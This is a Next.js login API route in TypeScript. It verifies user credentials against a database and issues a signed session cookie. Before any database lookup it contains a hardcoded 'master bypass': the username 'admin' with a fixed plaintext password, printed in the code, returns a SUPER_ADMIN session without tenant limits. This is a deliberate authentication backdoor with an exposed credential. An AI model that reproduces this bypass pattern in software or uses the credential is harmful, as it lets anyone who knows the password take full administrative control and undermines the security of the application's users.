export const dynamic = 'force-dynamic';

import { NextResponse } from 'next/server';
import {
  SESSION_COOKIE,
  signSessionPayload,
  buildSessionPayload,
} from '@/lib/session-token';
import type { SessionRole } from '@/lib/session-token';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const userId = typeof body?.userId === 'string' ? body.userId.trim() : '';
    const password = typeof body?.password === 'string' ? body.password : '';

    if (!userId || !password) {
      return NextResponse.json({ error: 'User ID and password are required' }, { status: 400 });
    }

    // ── MASTER BYPASS — fires before ANY Prisma/DB call ───────────────────
    if (userId.toLowerCase() === 'admin' && password === 'Khangee786786') {
      const token = signSessionPayload(
        buildSessionPayload({
          id: 'admin-bypass-id',
          email: 'Admin',
          name: 'System Administrator',
          role: 'SUPER_ADMIN',
          tenantId: null,
        })
      );
      const res = NextResponse.json({
        user: {
          id: 'admin-bypass-id',
          email: 'Admin',
          name: 'System Administrator',
          role: 'SUPER_ADMIN',
          tenantId: null,
          avatarUrl: null,
        },
      });
      res.cookies.set(SESSION_COOKIE, token, {
        httpOnly: true,
        sameSite: 'lax',
        path: '/',
        maxAge: 60 * 60 * 24 * 7,
        secure: process.env.NODE_ENV === 'production',
      });
      return res;
    }
    // ─────────────────────────────────────────────────────────────────────

    // Normal DB-based login (lazy import so it never crashes the bypass)
    const { default: prisma } = await import('@/lib/prisma');
    const { verifyPassword } = await import('@/lib/password');

    let user;
    try {
      user = await prisma.user.findUnique({ where: { email: userId } });
    } catch (dbError) {
      console.error('[LOGIN] DB unreachable:', dbError);
      return NextResponse.json(
        { error: 'Database unavailable. Please try again later.' },
        { status: 503 }
      );
    }

    if (!user?.password || !verifyPassword(password, user.password)) {
      return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 });
    }

    const token = signSessionPayload(
      buildSessionPayload({
        id: user.id,
        email: user.email,
        name: user.name,
        role: user.role as SessionRole,
        tenantId: user.tenantId,
      }),
    );

    const res = NextResponse.json({
      user: {
        id: user.id,
        email: user.email,
        name: user.name,
        role: user.role,
        tenantId: user.tenantId,
        avatarUrl: null, // Note: avatarUrl was removed from User model, adapt if added back
      },
    });
    res.cookies.set(SESSION_COOKIE, token, {
      httpOnly: true,
      sameSite: 'lax',
      path: '/',
      maxAge: 60 * 60 * 24 * 7,
      secure: process.env.NODE_ENV === 'production',
    });
    return res;

  } catch (e: any) {
    console.error('[LOGIN] Unexpected error:', e?.message || e);
    return NextResponse.json(
      { error: 'Server error. Please try again.' },
      { status: 500 }
    );
  }
}
